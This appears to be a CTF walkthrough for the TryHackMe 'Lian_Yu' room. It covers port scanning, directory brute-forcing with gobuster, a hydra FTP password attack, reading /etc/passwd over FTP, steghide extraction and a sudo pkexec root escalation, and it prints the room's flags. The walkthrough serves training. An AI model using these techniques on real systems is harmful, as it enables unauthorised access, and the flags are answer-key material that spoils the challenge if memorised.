# Tryhackme.com Room : Lian_Yu
`https://tryhackme.com/room/lianyu`


# Instance
```
export IP=10.10.33.18
```

# Nmap
```
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39005/tcp6  status
|   100024  1          39994/tcp   status
|   100024  1          55846/udp6  status
|_  100024  1          60027/udp   status

```

Let's browse the websever.
Not much, just a static page

We gobuster the server `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP`
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```

Not much here, let's find directories `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://$IP`
```
/island (Status: 301)
/server-status (Status: 403)
```

We get a static page at `/island`
```
 Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante

```

Let's gobuster again `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://$IP/island`
```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
```

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://$IP/island`


We get a static page with a video. We can see this comment in the html
```
you can avail your .ticket here but how?
```

let's gobuster again
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://$IP/island/2100`

Can't find anything..

In the mean time, I found that `vigilante` is a valid ftp username.

Seems like we got to find a `*.ticket` file. Tried enumerating with gobuster without luck..

trying to bruteforce ftp password
```
hydra -l vigilante -P /usr/share/wordlists/fasttrack.txt $IP ftp
```

No luck.

Soo, it was actually pretty stupid, just run gobuster with `-x EXTENSION`.
Was trying to run it with multiple wordlists but was actually :
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://$IP/island/2100 -x .ticket`

```
/green_arrow.ticket (Status: 200)
```

We get
```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

Look like base64.. But actually it is base58 (The hint mentionned `https://gchq.github.io/CyberChef/`)
```
!#th3h00d
```

Using webbrowser we reach `ftp://10.10.33.18` and retrieve the 3 images

The `leave_me_alone.png` cannot be displayed, it might not even be an image.

Didn't find any strings in all the images.
There is a `slade` folder in `../`

So we got to get access to the `slade` user

We confirm this reading `ftp://10.10.33.18/../../../etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:104:109::/run/uuidd:/bin/false
Debian-exim:x:105:110::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
slade:x:1000:1000:slade,,,:/home/slade:/bin/bash
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:110:118:ftp daemon,,,:/srv/ftp:/bin/false
vigilante:x:1001:1001:,,,:/home/vigilante:/bin/bash
```

We go back to `Leave_me_alone.png`. We fix the header bytes of the file with `hexeditor`. We can just compare with `Queen_Gambit.png` and use the same first 8 bytes.

We can then see the png image and see the text
```
Just leave me alone. Here take it what you want password
```

We try steghide on `Leave_me_alone.png` but its doesn't support png. We try on `aa.jpg` with passphrase `password` and get a zip file with :
```
passwd.txt
shadow
```

In passwd we find :

```
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

In shadow we find
```
M3tahuman
```

we `cat user.txt` :
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

`sudo -l` give us:
```
(root) PASSWD: /usr/bin/pkexec
```

We can run `sudo /usr/bin/pkexec --user root id`
```
uid=0(root) gid=0(root) groups=0(root)
```

We can then just `sudo /usr/bin/pkexec --user root cat /root/root.txt` :
```
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

We get the root flag :
```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```


